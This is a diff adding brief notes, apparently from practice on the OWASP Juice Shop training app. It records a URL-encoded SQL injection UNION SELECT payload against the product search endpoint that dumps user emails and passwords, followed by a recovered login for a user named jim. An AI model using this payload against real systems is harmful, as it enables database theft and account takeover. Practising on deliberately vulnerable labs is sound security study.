@@ -1,0 +1,6 @@
+Juice shop attack
+/rest/products/search?q=apple
+/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users--
+
+jim@juice-sh.op
+ncc-1701
